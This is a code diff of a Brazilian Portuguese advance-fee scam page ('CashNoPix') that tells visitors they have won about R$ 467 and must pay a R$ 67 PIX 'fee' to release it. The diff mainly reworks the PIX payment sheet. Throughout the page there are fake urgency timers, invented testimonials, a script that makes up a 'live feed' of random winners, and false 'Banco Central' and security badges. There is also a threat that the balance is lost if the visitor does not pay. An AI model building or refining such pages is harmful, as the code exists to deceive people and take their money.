@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -9,34 +8,117 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="stylesheet" href="style.css">
   <script src="pixel.js"></script>
+  <style>
+    /* PIX overlay — sempre display:flex, visibilidade por opacity/visibility */
+    .pix-overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 9999;
+      background: rgba(0,0,0,0.7);
+      display: flex;
+      align-items: flex-end;
+      justify-content: center;
+      opacity: 0;
+      visibility: hidden;
+      pointer-events: none;
+      transition: opacity 0.28s ease, visibility 0.28s ease;
+    }
+    .pix-overlay.open {
+      opacity: 1;
+      visibility: visible;
+      pointer-events: auto;
+    }
+    .pix-sheet {
+      background: #fff;
+      border-radius: 24px 24px 0 0;
+      width: 100%;
+      max-width: 480px;
+      max-height: 92vh;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+      padding: 0 0 env(safe-area-inset-bottom, 16px);
+      transform: translateY(100%);
+      transition: transform 0.4s cubic-bezier(0.34,1.56,0.64,1);
+      position: relative;
+    }
+    .pix-overlay.open .pix-sheet {
+      transform: translateY(0);
+    }
+    /* Tapa o gap do safe-area no iPhone */
+    .pix-sheet::after {
+      content: '';
+      display: block;
+      height: env(safe-area-inset-bottom, 0px);
+      background: #fff;
+    }
+    .pix-sheet-inner {
+      padding: 20px 20px 6px;
+    }
+    .sheet-handle {
+      width: 40px; height: 4px;
+      background: #e2e8f0;
+      border-radius: 2px;
+      margin: 0 auto 18px;
+    }
+    .sheet-close-btn {
+      position: absolute;
+      top: 14px; right: 14px;
+      background: #f1f5f9;
+      border: none;
+      width: 30px; height: 30px;
+      border-radius: 50%;
+      font-size: 16px;
+      cursor: pointer;
+      display: flex; align-items: center; justify-content: center;
+      color: #64748b;
+    }
+    .sheet-icon { text-align: center; font-size: 32px; margin-bottom: 4px; }
+    .sheet-title { text-align: center; font-size: 19px; font-weight: 800; color: #0f172a; margin-bottom: 2px; }
+    .sheet-timer { text-align: center; font-size: 13px; color: #64748b; margin-bottom: 6px; }
+    .sheet-timer strong { color: #ef4444; }
+    .sheet-desc  { text-align: center; font-size: 13px; color: #475569; line-height: 1.6; margin-bottom: 16px; }
+    .sheet-desc strong { color: #16a34a; }
+    .sheet-qr-wrap { text-align: center; margin-bottom: 12px; }
+    .sheet-qr-wrap img { width: 190px; height: 190px; border-radius: 12px; border: 1px solid #e2e8f0; padding: 4px; background: #fff; }
+    .sheet-code-box { background: #f8fafc; border-radius: 12px; padding: 12px; margin-bottom: 14px; }
+    .sheet-code-label { font-size: 11px; font-weight: 700; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.8px; text-align: center; margin-bottom: 7px; }
+    .sheet-code-value { background: #fff; border: 1.5px solid #e2e8f0; border-radius: 8px; padding: 10px 12px; font-family: monospace; font-size: 11px; word-break: break-all; color: #475569; line-height: 1.5; margin-bottom: 10px; min-height: 44px; }
+    .sheet-copy-btn { width: 100%; background: #16a34a; color: #fff; border: none; border-radius: 10px; padding: 13px; font-size: 14px; font-weight: 700; cursor: pointer; font-family: inherit; transition: background 0.15s; }
+    .sheet-copy-btn:active { background: #15803d; }
+    .sheet-copy-btn:disabled { background: #94a3b8; cursor: default; }
+    .sheet-copy-btn.copied { background: #15803d; }
+    .sheet-how { background: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 12px; padding: 12px; margin-bottom: 12px; }
+    .sheet-how p { margin: 0; font-size: 13px; color: #475569; line-height: 1.85; }
+    .sheet-how strong { color: #15803d; }
+    .sheet-live { display: flex; align-items: center; justify-content: center; gap: 7px; margin-bottom: 10px; }
+    .live-dot { width: 8px; height: 8px; background: #16a34a; border-radius: 50%; animation: liveBlink 1s infinite; }
+    @keyframes liveBlink { 0%,100%{opacity:1} 50%{opacity:.2} }
+    .sheet-secure { text-align: center; font-size: 11px; color: #cbd5e1; padding-bottom: 8px; }
+  </style>
 </head>
 
 <body class="taxa-page">
 
-  <!-- ① Sticky red urgency bar -->
+  <!-- ALERT BAR -->
   <div class="alert-bar">
     <span>⏱</span>
     🔥 ÚLTIMOS MINUTOS! Seu saque expira em:&nbsp;<strong id="alertTimer">9:51</strong>
   </div>
 
-  <!-- ② Video Vturb -->
-  <vturb-smartplayer id="vid-69e18162f11e94b651081061"
-    style="display: block; margin: 0 auto; width: 100%; "></vturb-smartplayer>
-  <script
-    type="text/javascript"> var s = document.createElement("script"); s.src = "https://scripts.converteai.net/9c10e7d2-9dcb-4433-995d-9eceac2bdf37/players/69e18162f11e94b651081061/v4/player.js", s.async = !0, document.head.appendChild(s); </script>
-  <video id="mainVideo" class="inline-video" controls playsinline preload="none">
-    <!-- <source src="seu-video.mp4" type="video/mp4"> -->
-  </video>
-  </div>
+  <!-- VIDEO -->
+  <vturb-smartplayer id="vid-69e18162f11e94b651081061" style="display:block;margin:0 auto;width:100%;"></vturb-smartplayer>
+  <script type="text/javascript">
+    var s=document.createElement("script");
+    s.src="https://scripts.converteai.net/9c10e7d2-9dcb-4433-995d-9eceac2bdf37/players/69e18162f11e94b651081061/v4/player.js";
+    s.async=!0;document.head.appendChild(s);
+  </script>
 
-  <!-- ③ Parabéns + saldo -->
+  <!-- PARABÉNS -->
   <div class="taxa-section">
     <div class="parabens-box">
       <div class="par-label">🎉 PARABÉNS! VOCÊ CONQUISTOU</div>
       <div class="par-amount">
-        <span>💰</span>
-        <span id="parAmt">R$ 0,00</span>
-        <span>💰</span>
+        <span>💰</span><span id="parAmt">R$ 0,00</span><span>💰</span>
       </div>
       <p class="par-sub">Última etapa para receber seu dinheiro</p>
     </div>
@@ -44,13 +126,12 @@
 
   <div class="taxa-divider"></div>
 
-  <!-- ④ Não paga nada -->
+  <!-- VOCÊ NÃO PAGA NADA -->
   <div class="taxa-section">
     <div class="nopay-box">
       <div style="flex-shrink:0;margin-top:2px;">
         <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2.5">
-          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" />
-          <polyline points="22 4 12 14.01 9 11.01" />
+          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/>
         </svg>
       </div>
       <div>
@@ -62,39 +143,28 @@
 
   <div class="taxa-divider"></div>
 
-  <!-- ⑤ Como funciona -->
+  <!-- COMO FUNCIONA -->
   <div class="taxa-section">
     <div class="how-title">📊 Como Funciona:</div>
-
     <div class="step-item">
-      <div class="step-num">1</div>
-      <div class="step-lbl">Você paga</div>
-      <div class="step-val">R$ 67,00</div>
-      <div class="step-small">(Taxa temporária)</div>
+      <div class="step-num">1</div><div class="step-lbl">Você paga</div>
+      <div class="step-val">R$ 67,00</div><div class="step-small">(Taxa temporária)</div>
     </div>
-
     <div class="step-arrow">↓</div>
-
     <div class="step-item yellow">
-      <div class="step-num">2</div>
-      <div class="step-lbl">Validamos</div>
-      <div class="step-val">Sua conta</div>
-      <div class="step-small">(Automático - 2h)</div>
+      <div class="step-num">2</div><div class="step-lbl">Validamos</div>
+      <div class="step-val">Sua conta</div><div class="step-small">(Automático - 2h)</div>
     </div>
-
     <div class="step-arrow">↓</div>
-
     <div class="step-item green">
-      <div class="step-num">3</div>
-      <div class="step-lbl">Você recebe</div>
-      <div class="step-val" id="step3Amt">R$ 0,00</div>
-      <div class="step-small">(Seu saque + taxa de volta)</div>
+      <div class="step-num">3</div><div class="step-lbl">Você recebe</div>
+      <div class="step-val" id="step3Amt">R$ 0,00</div><div class="step-small">(Seu saque + taxa de volta)</div>
     </div>
   </div>
 
   <div class="taxa-divider"></div>
 
-  <!-- ⑥ Por que a taxa -->
+  <!-- POR QUE A TAXA -->
   <div class="taxa-section">
     <div class="why-box">
       <div class="why-title">🔍 Por que precisamos da taxa?</div>
@@ -104,15 +174,13 @@
         <strong>Você recebe 100% de volta em até 2 horas!</strong>
       </div>
       <div class="live-line">🔥&nbsp;<strong>55 pessoas</strong> liberaram o saque nas últimas 24h</div>
-      <div class="live-line" id="liveFeedEl">
-        🔥&nbsp;<span>João S. acabou de receber R$ 534,38 (há 2 min)</span>
-      </div>
+      <div class="live-line" id="liveFeedEl">🔥&nbsp;<span>João S. acabou de receber R$ 534,38 (há 2 min)</span></div>
     </div>
   </div>
 
   <div class="taxa-divider"></div>
 
-  <!-- ⑦ Bônus especial (purple) -->
+  <!-- BÔNUS ESPECIAL -->
   <div class="taxa-section">
     <div class="bonus-purple">
       <div class="bp-title">💰 BÔNUS ESPECIAL! 💰</div>
@@ -129,99 +197,30 @@
 
   <div class="taxa-divider"></div>
 
-  <!-- ⑧ Depoimentos -->
+  <!-- DEPOIMENTOS -->
   <div class="taxa-section">
     <div class="sec-heading">🔥 Veja quem acabou de receber:</div>
-
     <div class="tcard">
-      <div class="tcard-top">
-        <div class="tcard-av">
-          <img src="https://i.pravatar.cc/40?img=11" alt="" onerror="this.parentElement.textContent='👨'">
-        </div>
-        <div>
-          <div class="tcard-name">Roberto Santos</div>
-          <div class="tcard-actions">Responder · Curtir · Seguir</div>
-        </div>
-      </div>
-      <div class="tcard-body">Obrigado! Recebi certinho os R$500, vai me ajudar muito na casa 🙏</div>
-      <div class="tcard-time">3 min</div>
+      <div class="tcard-top"><div class="tcard-av"><img src="https://i.pravatar.cc/40?img=11" alt=""></div><div><div class="tcard-name">Roberto Santos</div><div class="tcard-actions">Responder · Curtir</div></div></div>
+      <div class="tcard-body">Obrigado! Recebi certinho os R$500, vai me ajudar muito na casa 🙏</div><div class="tcard-time">3 min</div>
     </div>
-
     <div class="tcard">
-      <div class="tcard-top">
-        <div class="tcard-av">
-          <img src="https://i.pravatar.cc/40?img=5" alt="" onerror="this.parentElement.textContent='👩'">
-        </div>
-        <div>
-          <div class="tcard-name">Rosana de Oliveira</div>
-          <div class="tcard-actions">Responder · Curtir · Seguir</div>
-        </div>
-      </div>
-      <div class="tcard-body">Pensei que seria golpe, mas que bom que não é. fiz o pagamento da taxa e caiu por aqui.
-      </div>
-      <div class="tcard-time">6 min</div>
+      <div class="tcard-top"><div class="tcard-av"><img src="https://i.pravatar.cc/40?img=5" alt=""></div><div><div class="tcard-name">Rosana de Oliveira</div><div class="tcard-actions">Responder · Curtir</div></div></div>
+      <div class="tcard-body">Pensei que seria golpe, mas que bom que não é. fiz o pagamento da taxa e caiu por aqui.</div><div class="tcard-time">6 min</div>
     </div>
-
     <div class="tcard">
-      <div class="tcard-top">
-        <div class="tcard-av">
-          <img src="https://i.pravatar.cc/40?img=24" alt="" onerror="this.parentElement.textContent='👩‍🦱'">
-        </div>
-        <div>
-          <div class="tcard-name">Silvana Freitas</div>
-          <div class="tcard-actions">Responder · Curtir · Seguir</div>
-        </div>
-      </div>
-      <div class="tcard-body">Sério? Estava desconfiada, mas vou tentar aqui...</div>
-      <div class="tcard-time">12 min</div>
+      <div class="tcard-top"><div class="tcard-av"><img src="https://i.pravatar.cc/40?img=33" alt=""></div><div><div class="tcard-name">Ulisses Soares</div><div class="tcard-actions">Responder · Curtir</div></div></div>
+      <div class="tcard-body">Pode confiar, testei aqui e funcionou, já to usando a 1 semana</div><div class="tcard-time">12 min</div>
     </div>
-
     <div class="tcard">
-      <div class="tcard-top">
-        <div class="tcard-av">
-          <img src="https://i.pravatar.cc/40?img=33" alt="" onerror="this.parentElement.textContent='👨‍🦳'">
-        </div>
-        <div>
-          <div class="tcard-name">Ulisses Soares</div>
-          <div class="tcard-actions">Responder · Curtir · Seguir</div>
-        </div>
-      </div>
-      <div class="tcard-body">Pode confiar, testei aqui e funcionou, já to usando a 1 semana</div>
-      <div class="tcard-time">12 min</div>
-    </div>
-
-    <div class="tcard">
-      <div class="tcard-top">
-        <div class="tcard-av">
-          <img src="https://i.pravatar.cc/40?img=47" alt="" onerror="this.parentElement.textContent='👩‍🦰'">
-        </div>
-        <div>
-          <div class="tcard-name">Bruna Fernanda</div>
-          <div class="tcard-actions">Responder · Curtir · Seguir</div>
-        </div>
-      </div>
-      <div class="tcard-body">Acabou de cair aqui na minha conta, obrigada 🙏</div>
-      <div class="tcard-time">17 min</div>
-    </div>
-
-    <div class="tcard">
-      <div class="tcard-top">
-        <div class="tcard-av">
-          <img src="https://i.pravatar.cc/40?img=32" alt="" onerror="this.parentElement.textContent='🧑🏾'">
-        </div>
-        <div>
-          <div class="tcard-name">Sophia Andrade</div>
-          <div class="tcard-actions">Responder · Curtir · Seguir</div>
-        </div>
-      </div>
-      <div class="tcard-body">Foi bem rápido até, muito obrigada, vim do Kuvv ❤</div>
-      <div class="tcard-time">22 min</div>
+      <div class="tcard-top"><div class="tcard-av"><img src="https://i.pravatar.cc/40?img=47" alt=""></div><div><div class="tcard-name">Bruna Fernanda</div><div class="tcard-actions">Responder · Curtir</div></div></div>
+      <div class="tcard-body">Acabou de cair aqui na minha conta, obrigada 🙏</div><div class="tcard-time">17 min</div>
     </div>
   </div>
 
   <div class="taxa-divider"></div>
 
-  <!-- ⑨ Garantia -->
+  <!-- GARANTIA -->
   <div class="taxa-section">
     <div class="guarantee-card">
       <span class="gar-icon">🛡️</span>
@@ -236,73 +235,102 @@
 
   <div class="taxa-divider"></div>
 
-  <!-- ⑩ FAQ -->
+  <!-- FAQ -->
   <div class="taxa-section">
     <div class="faq-item">
-      <button class="faq-btn" onclick="toggleFaq(this)">
-        ❓ Por que preciso pagar uma taxa?
-        <span class="faq-ico">+</span>
-      </button>
-      <div class="faq-ans">A taxa de R$ 67,00 é temporária e serve para validar sua identidade e evitar fraudes. Ela é
-        devolvida 100% junto com seu saque em até 2 horas.</div>
+      <button class="faq-btn" onclick="toggleFaq(this)">❓ Por que preciso pagar uma taxa?<span class="faq-ico">+</span></button>
+      <div class="faq-ans">A taxa de R$ 67,00 é temporária e serve para validar sua identidade e evitar fraudes. Ela é devolvida 100% junto com seu saque em até 2 horas.</div>
     </div>
     <div class="faq-item">
-      <button class="faq-btn" onclick="toggleFaq(this)">
-        ⏰ Quanto tempo para receber?
-        <span class="faq-ico">+</span>
-      </button>
-      <div class="faq-ans">Após confirmar o pagamento, você receberá seu saque em até 2 horas. A maioria das
-        transferências ocorre em menos de 30 minutos!</div>
+      <button class="faq-btn" onclick="toggleFaq(this)">⏰ Quanto tempo para receber?<span class="faq-ico">+</span></button>
+      <div class="faq-ans">Após confirmar o pagamento, você receberá seu saque em até 2 horas. A maioria das transferências ocorre em menos de 30 minutos!</div>
     </div>
     <div class="faq-item">
-      <button class="faq-btn" onclick="toggleFaq(this)">
-        🔒 É seguro?
-        <span class="faq-ico">+</span>
-      </button>
-      <div class="faq-ans">Sim! Todos os seus dados são criptografados com SSL 256 bits. Temos mais de 50.000 pessoas
-        que já receberam com total segurança.</div>
+      <button class="faq-btn" onclick="toggleFaq(this)">🔒 É seguro?<span class="faq-ico">+</span></button>
+      <div class="faq-ans">Sim! Todos os seus dados são criptografados com SSL 256 bits. Temos mais de 50.000 pessoas que já receberam com total segurança.</div>
     </div>
     <div class="faq-item">
-      <button class="faq-btn" onclick="toggleFaq(this)">
-        😰 E se eu não pagar?
-        <span class="faq-ico">+</span>
-      </button>
-      <div class="faq-ans">Seu saldo acumulado será cancelado automaticamente e as vagas serão liberadas para outros
-        usuários. Não perca essa oportunidade exclusiva!</div>
+      <button class="faq-btn" onclick="toggleFaq(this)">😰 E se eu não pagar?<span class="faq-ico">+</span></button>
+      <div class="faq-ans">Seu saldo acumulado será cancelado automaticamente e as vagas serão liberadas para outros usuários. Não perca essa oportunidade exclusiva!</div>
     </div>
   </div>
 
-  <!-- Espaço para a barra CTA fixa não cobrir conteúdo -->
-  <div style="height:104px;"></div>
+  <!-- ESPAÇO PARA O CTA FIXO -->
+  <div style="height:90px;"></div>
 
-  <!-- ⑪ CTA bar — FIXED na parte inferior, sempre visível -->
+  <!-- CTA FIXO NO FUNDO -->
   <div class="cta-sticky">
     <button class="cta-btn" id="ctaBtn" onclick="abrirPix(67)">
       💰 LIBERAR MEU SAQUE DE&nbsp;<span id="ctaAmt">R$ 0,00</span>&nbsp;✨
     </button>
     <div class="cta-meta">
-      🔒 Pagamento 100% Seguro e Criptografado
-      &bull; 🏦 Banco Central
-      &bull; ⭐ 4,8/5
+      🔒 Pagamento 100% Seguro e Criptografado &bull; 🏦 Banco Central &bull; ⭐ 4,8/5
     </div>
   </div>
 
+  <!-- ================================================
+       PIX BOTTOM SHEET — DENTRO do body, antes de </body>
+       O position:fixed garante que fica acima de tudo
+       ================================================ -->
+  <div class="pix-overlay" id="pixOverlay" role="dialog" aria-modal="true">
+    <div class="pix-sheet" id="pixSheet">
+      <div class="pix-sheet-inner">
+        <div class="sheet-handle"></div>
+        <button class="sheet-close-btn" onclick="fecharPix()" aria-label="Fechar">✕</button>
+
+        <div class="sheet-icon">⚡</div>
+        <div class="sheet-title">Aguardando Pagamento</div>
+        <div class="sheet-timer">Expira em: <strong><span id="sheetTimer">15:00</span></strong></div>
+        <div class="sheet-desc">
+          Para liberar seu saque de <strong>R$ 467,83</strong>, pague a taxa de
+          <strong id="pixValorDisplay">R$ 67,00</strong>.
+        </div>
+
+        <div id="qrCodeContainer" class="sheet-qr-wrap" style="display:none;">
+          <img id="pixQrImg" src="" alt="QR Code PIX">
+        </div>
+
+        <div class="sheet-code-box">
+          <div class="sheet-code-label">Chave PIX — Copia e Cola</div>
+          <div class="sheet-code-value" id="pixCode">Gerando seu PIX...</div>
+          <button class="sheet-copy-btn" id="copyBtn" onclick="copiarPix()" disabled>📋 Copiar Chave PIX</button>
+        </div>
+
+        <div class="sheet-how">
+          <p><strong>Como pagar:</strong><br>
+          1. Abra seu banco ou carteira digital<br>
+          2. Selecione <strong>PIX Copia e Cola</strong><br>
+          3. Cole a chave copiada<br>
+          4. Confirme o pagamento</p>
+        </div>
+
+        <div class="sheet-live">
+          <div class="live-dot"></div>
+          <span style="font-size:13px;color:#16a34a;font-weight:600;">Validando pagamento em tempo real</span>
+        </div>
+
+        <div class="sheet-secure">🔒 SSL Seguro &nbsp;·&nbsp; 🏦 Banco Central &nbsp;·&nbsp; ⭐ 4,8/5</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SCRIPTS — carregam depois que todo HTML está pronto -->
   <script src="sounds.js"></script>
   <script src="backredirect.js"></script>
   <script src="pay.js"></script>
   <script>
-    /* ============== STATE ============== */
+    /* ===== STATE ===== */
     const state = JSON.parse(localStorage.getItem('cnp') || '{}');
-    const bal = state.balance ?? 467.83;
-    const fmtBrl = n => 'R$ ' + n.toFixed(2).replace('.', ',');
+    const bal   = state.balance ?? 467.83;
+    const fmt   = n => 'R$ ' + n.toFixed(2).replace('.', ',');
 
-    document.getElementById('parAmt').textContent = fmtBrl(bal);
-    document.getElementById('ctaAmt').textContent = fmtBrl(bal);
-    document.getElementById('garBal').textContent = bal.toFixed(2).replace('.', ',');
-    document.getElementById('bpTotal').textContent = fmtBrl(bal + 50);
-    document.getElementById('step3Amt').textContent = fmtBrl(bal + 67);
+    document.getElementById('parAmt').textContent   = fmt(bal);
+    document.getElementById('ctaAmt').textContent   = fmt(bal);
+    document.getElementById('garBal').textContent   = bal.toFixed(2).replace('.', ',');
+    document.getElementById('bpTotal').textContent  = fmt(bal + 50);
+    document.getElementById('step3Amt').textContent = fmt(bal + 67);
 
-    /* ============== TIMERS ============== */
+    /* ===== TIMERS ===== */
     let alertSecs = 591;
     setInterval(() => {
       if (alertSecs > 0) alertSecs--;
@@ -318,30 +346,29 @@
       document.getElementById('bonusTimer').textContent = m + ':' + String(s).padStart(2, '0');
     }, 1000);
 
-    /* ============== LIVE FEED ============== */
-    const feedNames = ['João S.', 'Maria C.', 'Pedro L.', 'Ana P.', 'Carlos M.', 'Fernanda R.', 'Marcos T.', 'Débora F.'];
+    /* ===== LIVE FEED ===== */
+    const NAMES = ['João S.','Maria C.','Pedro L.','Ana P.','Carlos M.','Fernanda R.','Marcos T.','Débora F.'];
     setInterval(() => {
-      const n = feedNames[Math.floor(Math.random() * feedNames.length)];
+      const n = NAMES[Math.floor(Math.random() * NAMES.length)];
       const a = (400 + Math.random() * 200).toFixed(2).replace('.', ',');
       const m = 1 + Math.floor(Math.random() * 6);
-      document.getElementById('liveFeedEl').innerHTML =
-        `🔥&nbsp;<span>${n} acabou de receber R$ ${a} (há ${m} min)</span>`;
+      document.getElementById('liveFeedEl').innerHTML = `🔥&nbsp;<span>${n} acabou de receber R$ ${a} (há ${m} min)</span>`;
     }, 6500);
 
-    /* ============== FAQ ============== */
+    /* ===== FAQ ===== */
     function toggleFaq(btn) {
-      const ans = btn.nextElementSibling;
-      const ico = btn.querySelector('.faq-ico');
+      const ans  = btn.nextElementSibling;
+      const ico  = btn.querySelector('.faq-ico');
       const open = ans.classList.contains('open');
       document.querySelectorAll('.faq-ans').forEach(a => a.classList.remove('open'));
       document.querySelectorAll('.faq-ico').forEach(i => i.classList.remove('open'));
       if (!open) { ans.classList.add('open'); ico.classList.add('open'); }
-      SFX.tick();
+      if (typeof SFX !== 'undefined') SFX.tick();
     }
 
-    /* ============== PIX MODAL ============== */
-    let pollingInterval = null;
-    let timerInterval  = null;
+    /* ===== PIX MODAL ===== */
+    let pixPolling = null;
+    let pixTimer   = null;
 
     async function abrirPix(valor = 67) {
       const overlay    = document.getElementById('pixOverlay');
@@ -351,22 +378,22 @@
       const valDisplay = document.getElementById('pixValorDisplay');
       const copyBtn    = document.getElementById('copyBtn');
 
-      // Atualiza valor na tela do modal
-      if (valDisplay) valDisplay.textContent = 'R$ ' + valor.toFixed(2).replace('.', ',');
+      // Atualiza valor exibido
+      if (valDisplay) valDisplay.textContent = 'R$ ' + Number(valor).toFixed(2).replace('.', ',');
 
-      // Abre o bottom sheet — apenas adicionar classe (CSS cuida do resto)
-      overlay.classList.add('pix-open');
+      // Abre o sheet via classe CSS
+      overlay.classList.add('open');
       document.body.style.overflow = 'hidden';
 
-      // Reset do estado visual
-      pixCode.innerText = 'Gerando seu PIX...';
+      // Estado inicial
+      pixCode.textContent = 'Gerando seu PIX...';
       qrCont.style.display = 'none';
       copyBtn.disabled = true;
 
       try {
         const data = await PAY.createPix(valor);
 
-        pixCode.innerText = data.copy_paste;
+        pixCode.textContent  = data.copy_paste || '';
         copyBtn.disabled = false;
 
         if (data.qrcode) {
@@ -374,146 +401,91 @@
           qrCont.style.display = 'block';
         }
 
-        iniciarTimer(900);
-        startPolling(data.id, valor);
+        _startTimer(900);
+        _startPolling(data.id, valor);
       } catch (err) {
-        pixCode.innerText = '❌ Erro ao gerar PIX. Feche e tente novamente.';
+        pixCode.textContent = '❌ Erro ao gerar PIX. Feche e tente novamente.';
         copyBtn.disabled = false;
-        console.error('PIX error:', err);
+        console.error('[PIX]', err);
       }
     }
-    // Expor para o backredirect.js usar
-    window.abrirPix = abrirPix;
+    window.abrirPix = abrirPix; // expõe para backredirect.js
 
-    function iniciarTimer(duration) {
-      if (timerInterval) clearInterval(timerInterval);
-      let timer = duration;
-      const display = document.getElementById('timer');
-      timerInterval = setInterval(() => {
-        const m = String(Math.floor(timer / 60)).padStart(2, '0');
-        const s = String(timer % 60).padStart(2, '0');
-        display.textContent = m + ':' + s;
-        if (--timer < 0) clearInterval(timerInterval);
+    function fecharPix() {
+      document.getElementById('pixOverlay').classList.remove('open');
+      document.body.style.overflow = '';
+      if (pixPolling) clearInterval(pixPolling);
+      if (pixTimer)   clearInterval(pixTimer);
+    }
+    window.fecharPix = fecharPix;
+
+    function _startTimer(duration) {
+      if (pixTimer) clearInterval(pixTimer);
+      let t = duration;
+      const el = document.getElementById('sheetTimer');
+      pixTimer = setInterval(() => {
+        const m = String(Math.floor(t / 60)).padStart(2, '0');
+        const s = String(t % 60).padStart(2, '0');
+        if (el) el.textContent = m + ':' + s;
+        if (--t < 0) clearInterval(pixTimer);
       }, 1000);
     }
 
-    function startPolling(id, valorPago = 67) {
-      if (pollingInterval) clearInterval(pollingInterval);
-      pollingInterval = setInterval(async () => {
-        const status = await PAY.checkStatus(id);
-        if (status === 'paid' || status === 'approved' || status === 'completed') {
-          clearInterval(pollingInterval);
-          PAY.trackPixel('Purchase', { value: valorPago, currency: 'BRL', content_name: 'Taxa CashNoPix' });
-          SFX.success();
+    function _startPolling(id, valor) {
+      if (pixPolling) clearInterval(pixPolling);
+      pixPolling = setInterval(async () => {
+        const st = await PAY.checkStatus(id);
+        if (st === 'paid' || st === 'approved' || st === 'completed') {
+          clearInterval(pixPolling);
+          if (typeof PAY.trackPixel === 'function') {
+            PAY.trackPixel('Purchase', { value: valor, currency: 'BRL', content_name: 'Taxa CashNoPix' });
+          }
+          if (typeof SFX !== 'undefined') SFX.success();
           setTimeout(() => { window.location.href = 'sucesso.html'; }, 1000);
         }
       }, 5000);
     }
 
-    function fecharPix() {
-      document.getElementById('pixOverlay').classList.remove('pix-open');
-      document.body.style.overflow = '';
-      if (pollingInterval) clearInterval(pollingInterval);
-      if (timerInterval)  clearInterval(timerInterval);
-    }
-
-    // Fechar ao clicar no backdrop
+    /* Fechar ao clicar fora (backdrop) */
     document.getElementById('pixOverlay').addEventListener('click', e => {
-      if (e.target === document.getElementById('pixOverlay')) fecharPix();
+      if (e.target.id === 'pixOverlay') fecharPix();
     });
 
-    // Swipe down para fechar (mobile)
-    let touchStartY = 0;
-    document.getElementById('pixCard').addEventListener('touchstart', e => {
-      touchStartY = e.changedTouches[0].clientY;
+    /* Swipe down para fechar */
+    let _touchY = 0;
+    document.getElementById('pixSheet').addEventListener('touchstart', e => {
+      _touchY = e.changedTouches[0].clientY;
     }, { passive: true });
-    document.getElementById('pixCard').addEventListener('touchend', e => {
-      if (e.changedTouches[0].clientY - touchStartY > 60) fecharPix();
+    document.getElementById('pixSheet').addEventListener('touchend', e => {
+      if (e.changedTouches[0].clientY - _touchY > 60) fecharPix();
     }, { passive: true });
 
-    /* ============== COPY PIX ============== */
+    /* ===== COPY PIX ===== */
     function copiarPix() {
       const code = document.getElementById('pixCode').textContent.trim();
       const btn  = document.getElementById('copyBtn');
-
-      function onCopied() {
-        btn.textContent = '✅ Copiado com sucesso!';
+      const ok = () => {
+        btn.textContent = '✅ Copiado!';
         btn.classList.add('copied');
-        SFX.copied();
-        setTimeout(() => {
-          btn.textContent = '📋 Copiar Chave PIX';
-          btn.classList.remove('copied');
-        }, 3000);
-      }
-
+        if (typeof SFX !== 'undefined') SFX.copied();
+        setTimeout(() => { btn.textContent = '📋 Copiar Chave PIX'; btn.classList.remove('copied'); }, 3000);
+      };
       if (navigator.clipboard && window.isSecureContext) {
-        navigator.clipboard.writeText(code).then(onCopied).catch(() => legacyCopy(code, onCopied));
+        navigator.clipboard.writeText(code).then(ok).catch(() => _legacyCopy(code, ok));
       } else {
-        legacyCopy(code, onCopied);
+        _legacyCopy(code, ok);
       }
     }
 
-    function legacyCopy(text, cb) {
+    function _legacyCopy(text, cb) {
       const ta = document.createElement('textarea');
       ta.value = text;
-      Object.assign(ta.style, { position: 'fixed', left: '-9999px', top: '-9999px', opacity: '0' });
+      Object.assign(ta.style, { position:'fixed', left:'-9999px', top:'-9999px', opacity:'0' });
       document.body.appendChild(ta);
       ta.focus(); ta.select();
-      try { document.execCommand('copy'); cb(); } catch (_) { }
+      try { document.execCommand('copy'); cb(); } catch(_) {}
       document.body.removeChild(ta);
     }
   </script>
 </body>
-
-<!-- ========================================================
-     PIX OVERLAY — fora do <body> para ficar acima de TUDO,
-     incluindo o CTA bar fixo e o back-redirect
-     ======================================================== -->
-<div class="pix-overlay" id="pixOverlay" role="dialog" aria-modal="true" aria-label="Pagar via PIX">
-  <div class="pix-card" id="pixCard">
-    <div class="pix-handle"></div>
-    <button class="pix-close" onclick="fecharPix()" aria-label="Fechar">✕</button>
-
-    <div class="pix-card-header">
-      <div class="pix-icon">⚡</div>
-      <div class="pix-title">Aguardando Pagamento</div>
-      <div class="pix-timer">Expira em: <span id="timer">15:00</span></div>
-      <div class="pix-desc">
-        Para liberar seu saque de <strong>R$ 467,83</strong>, finalize o pagamento de
-        <strong id="pixValorDisplay">R$ 67,00</strong>.
-      </div>
-    </div>
-
-    <div class="pix-code-box">
-      <div id="qrCodeContainer" style="display:none;text-align:center;margin-bottom:15px;">
-        <img id="pixQrImg" src="" style="width:200px;height:200px;display:inline-block;border-radius:12px;border:1px solid #e2e8f0;padding:5px;background:#fff;">
-      </div>
-      <div class="pix-code-label">Chave PIX — Copia e Cola:</div>
-      <div class="pix-code-value" id="pixCode">Gerando seu PIX...</div>
-      <button class="btn-copy" id="copyBtn" onclick="copiarPix()" disabled>
-        📋 Copiar Chave PIX
-      </button>
-    </div>
-
-    <div class="pix-how">
-      <p style="font-size:13px;font-weight:700;color:#065f46;margin-bottom:7px;">Como pagar:</p>
-      <p style="font-size:13px;color:#475569;line-height:1.85;">
-        1. Abra seu banco ou carteira digital<br>
-        2. Selecione <strong>PIX Copia e Cola</strong><br>
-        3. Cole a chave copiada<br>
-        4. Confirme o pagamento
-      </p>
-    </div>
-
-    <div class="pix-live">
-      <div class="live-dot"></div>
-      <span style="font-size:13px;color:#16a34a;font-weight:600;">Validando pagamento em tempo real</span>
-    </div>
-
-    <p style="font-size:11px;color:#94a3b8;text-align:center;margin-top:10px;">
-      🔒 SSL Seguro &nbsp;·&nbsp; 🏦 Banco Central &nbsp;·&nbsp; ⭐ 4,8/5
-    </p>
-  </div>
-</div>
-
 </html>
